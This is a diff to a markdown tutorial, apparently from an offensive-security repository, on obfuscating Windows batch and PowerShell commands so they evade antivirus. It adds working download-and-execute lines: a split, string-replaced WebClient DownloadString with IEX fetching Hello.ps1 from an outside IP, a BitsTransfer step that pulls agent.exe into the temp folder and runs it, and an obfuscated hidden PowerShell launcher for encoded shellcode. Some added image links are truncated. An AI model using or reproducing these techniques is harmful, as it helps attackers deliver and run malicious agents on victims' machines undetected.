@@ -184,8 +184,8 @@ The above string can be obfuscated using the **batch special character: "** <br 
       Using base64 stings decoded at runtime are a Useful obfuscation trick, because
       the agent.bat dosen't contain any real malicious syscall's to be scan/flagged.
 
-      HINT: Since windows dosen't have a base64 term interpreter built-in installed,
-      we have two choises to decode the base64 encoded syscall, or use the built-in
+      HINT: Since windows dosen't have a base64 term interpreter built in installed,
+      we have two choises to decode the base64 encoded syscall, or use the built in
       powershell (::FromBase64String) switch to decode our syscall or we chose to use
       certutil, but certuil onlly accepts strings taken from inside a text file, in
       that situation we instruct our script to writte the text files containing the
@@ -453,7 +453,7 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 - String obfuscated<br />
 
-      $encoded= "(New-Object Net.We~~bClient).Downlo~~adString('h'+'ttp'+'://192.168.1.71/Hello.ps1')"
+      $encoded= "(New-Object Net.We~~bClient).Downlo~~adString('http://192.168.1.71/Hello.ps1')"
       $decoded = $encoded.Replace("~~","")
       IEX $decoded
 
@@ -466,8 +466,27 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 ---
 
+      TODO: [ ScriptBlock -Replace method ]
+      Build a variable named $ScriptBlockContents with the 'SPLIT' syscall inside, and use .Replace("+","")
+      to 'de-split' the syscall into a new local variable named $syscall, to be called at run-time.
+
+<br />
+
+- String command to obfuscate<br />
+`("New-Object Net.WebClient).DownloadString('http://192.168.1.71/Hello.ps1')`
+
+- String obfuscated<br />
+
+      $ScriptBlockContents = @"(#Ne"+"w-Ob"+"ject Ne"+"t.Web"+"Cli"+"ent#).DownloadString(!ht'+'tp:'+'//19'+'2.16'+'8.1'+'.71/Hello.ps1!)"@
+      $syscall = $ScriptBlockContents.Replace("+","").Replace('"','').Replace("'","").Replace("!","'").Replace('#','"')
+      IEX $syscall
+
+![powershell obfuscation](http://i.)
+
+---
+
       [RTLO] Powershell cames with one buitin feature (::Reverse) that allow us to change the
-      text alignment from left to rigth side (arabe alignment). That built-in feature allow us
+      text alignment from left to rigth side (arabe alignment). That built in feature allow us
       to use it as obfuscation technic (writing syscall's backwards) and 'revert' them at run-time.
 
 <br />
@@ -506,13 +525,16 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 ![powershell obfuscation](http://i.cubeupload.com/1hy2GA.jpg)
 
-- **Stacking** commands together with the **&** caret
+
+TODO: - **Stacking** commands together with the **;** caret
 
 - String command to obfuscate<br />
 `Invoke-Expression (New-Object)`
 
 - String obfuscated<br />
-`("{0}{2}{1}{3}" -f'Invoke','es','-Expr','sion') (&( "{0}{2}{1}" -f'(New','ject)','-Ob'))`
+`("{0}{2}{1}{3}" -f'Invoke','es','-Expr','sion') ; ("{0}{2}{1}" -f'(New','ject)','-Ob'))`
+
+![powershell obfuscation](http://i.)
 
 ---
 
@@ -526,6 +548,22 @@ The above string can be obfuscated using **powershell special characters:** **`*
       I`E`X ('({0}w-Object {0}t.WebClient).{1}String("{2}19`2.16`8.1`.71/He`ll`o.ps`1")' -f'Ne','Download','http://)
 
 ![powershell obfuscation](http://i.cubeupload.com/p9j54c.jpg)
+
+---
+
+      TODO: [ BitsTransfer ]
+      Another way to download/execute remotelly our agent without using the powershell switch
+      'Net.WebClient.DownloadString' method. This method allow us to chose the download location
+      in target system and start the agent (exe).
+
+<br />
+
+      Import-Module BitsTransfer
+      $path = [environment]::getfolderpath("temp")
+      Start-BitsTransfer -Source "http://192.168.1.71/agent.exe" -Destination "$path\agent.exe"
+      Invoke-Item "$path\agent.exe"
+
+![powershell obfuscation](http://i.)
 
 ---
 
@@ -731,7 +769,7 @@ Here we can view the all process of encoding/decoding in powershell console
       executing any malicious actions (agent execution) replace any main functions (syscall's)
       by base64 encoded variables/funtions, and store them inside your script (agent) to be called
       at run-time execution, also remmenber to use 'Rubish Data' piped (|) before your system call's
-      and the last but not least, Concatenate/splatting also all function names also to use big and small
+      and the last but not least, Concatenate/splatting all function names also to use big and small
       letters (eg: Po"W"e^Rs%!h%E^lL"."e^%i:~14,1%^E) since cmd.exe interpreter its not case sensitive.
 
       Its never to late to remmenber that diferent technics can be combined together to achieve
@@ -741,9 +779,26 @@ Here we can view the all process of encoding/decoding in powershell console
 <br />
 
       DE-OBFUSCATED : cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $ENCODED-SHELLCODE-STRING
-      OBFUSCATED    : @c^M%k8%.E"x"%!h% /%i0:~1,1% =P%i0:~12,1%^W%!h%rS%i0:~6,1%%!h%l^L"."%!h%Xe '-'%U7%op "-"wI%U7%%k8% H%i0:~7,1%%k8%D%!h%N '-'%!h%^X'e'%C By%i0:~13,1%A^s%i0:~16,1% "-"%U7%O^n%i0:~7,1% "-"%!h%NC $ENCODED-SHELLCODE-STRING
+      OBFUSCATED    : @c^M%k8%.E"x"%!h% /%i0:~1,1% =P%i0:~12,1%^W%!h%rS%i0:~6,1%%!h%l^L"."%!h%Xe '-'%U7%op "-"wI%U7%%k8% H%i0:~7,1%%k8%'D'%!h%N '-'%!h%^X'e'%C By%i0:~13,1%A^s%i0:~16,1% "-"%U7%O^n%i0:~7,1% "-"%!h%NC $ENCODED-SHELLCODE-STRING
 
 [!] [The above OBFUSCATED syscall (string) its embbebed into this demo template.bat](https://pastebin.com/vnNELqd4)<br />
+
+---
+
+<br />
+
+      TODO: Reward technic [ re-obfuscation-encoding ] by: r00t-3xp10it
+      This technic can be used in cmd.exe | bash | powershell.exe interpreter, but this example
+      its written to describe the technic under powershell interpreter (terminal or script.ps1)
+
+      1º - Take one obfuscated command                          (example: G`et-Wm`iOb`ject)
+      2º - Encode the obfuscated command into a base64 string   (RsNGdSIfGagTed=)
+      3º - $reobfuscation = "RsNGdSIfGagTed="                   (store encoded syscall into one psh variable)
+      4º - $decoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($reobfuscation))
+      5º - powershell.exe $decoded -Class Win32_ComputerSystem  (decode the syscall at run-time)
+
+![powershell obfuscation](http://i.)
+
 [0] [Glosario](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario)<br />
 
 ---
